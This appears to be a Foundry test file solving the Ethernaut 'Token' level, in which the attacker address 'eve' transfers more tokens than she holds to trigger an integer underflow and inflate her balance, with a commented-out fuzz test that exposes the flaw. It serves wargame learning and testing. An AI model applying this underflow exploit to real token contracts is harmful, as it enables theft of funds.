// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// testing functionalities
import "forge-std/Test.sol";

// Ethernaut game components
import "src/core/Ethernaut.sol";
import "src/levels/05-Token/TokenFactory.sol";

contract TokenTest is Test {
    /*//////////////////////////////////////////////////////////////
                            GAME INSTANCE SETUP
    //////////////////////////////////////////////////////////////*/

    Ethernaut ethernaut;

    /// @dev eve is the attacker
    address eve = makeNameForAddress("eve");

    function setUp() public {
        emit log_string("Setting up Token level...");
        ethernaut = new Ethernaut();
    }

    /*//////////////////////////////////////////////////////////////
                EXAMPLE UNIT TEST TO MITIGATE THE ISSUE 
    //////////////////////////////////////////////////////////////*/

    /**
     * @dev fuzz test below is commented out to make GitHub actions pass
     * it ilustrates the vulnerability present in the Token contract
     */

    /*
    function test_fuzz_transferShouldProperlyUpdateBalances(uint256 value)
        public
    {
        // Quick setup of Token contract instance
        Token token;
        token = new Token(21_000_000);

        // a simple fuzz test would show the presence of the underflow
        uint256 balanceBefore = token.balances(msg.sender);
        token.transfer(address(0x123), value);
        uint256 balanceAfter = token.balances(msg.sender);
        assertEq(balanceBefore - value, balanceAfter);
    }
    */

    /*//////////////////////////////////////////////////////////////
                LEVEL INSTANCE -> EXPLOIT -> SUBMISSION
    //////////////////////////////////////////////////////////////*/

    function test_TokenExploit() public {
        /*//////////////////////////////////////////////////////////////
                            LEVEL INSTANCE SETUP
        //////////////////////////////////////////////////////////////*/

        TokenFactory tokenFactory = new TokenFactory();

        ethernaut.registerLevel(tokenFactory);
        vm.startPrank(eve);

        address levelAddress = ethernaut.createLevelInstance(tokenFactory);
        Token tokenContract = Token(levelAddress);

        emit log_named_address("Eve's address: ", address(eve));
        emit log_named_uint(
            "Eve's balance of tokens (before): ",
            tokenContract.balances(eve)
        );

        /*//////////////////////////////////////////////////////////////
                                LEVEL EXPLOIT
        //////////////////////////////////////////////////////////////*/

        emit log_string("Starting the exploit... 🧨");
        uint amount = 21;
        address callAddress = address(0x123);
        emit log_named_address(
            "Calling transfer with the address of: ",
            callAddress
        );
        emit log_named_uint("Calling transfer with the _value of: ", amount);
        tokenContract.transfer(callAddress, amount);

        emit log_named_uint(
            "Eve's balance of tokens (after): ",
            tokenContract.balances(eve)
        );

        /*//////////////////////////////////////////////////////////////
                                LEVEL SUBMISSION
        //////////////////////////////////////////////////////////////*/

        bool challengeCompleted = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(challengeCompleted);
    }

    /*//////////////////////////////////////////////////////////////
                            HELPER FUNCTIONS
    //////////////////////////////////////////////////////////////*/

    /**
     * I've found this useful function
     * in github/twpony Ethernaut repo
     * @notice This function allows for creating labels (names) for addresses
     * which will improve readability in traces
     * @param name you pass the name like "alice" or "bob" and it will create
     * an address for that person
     */
    function makeNameForAddress(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }
}
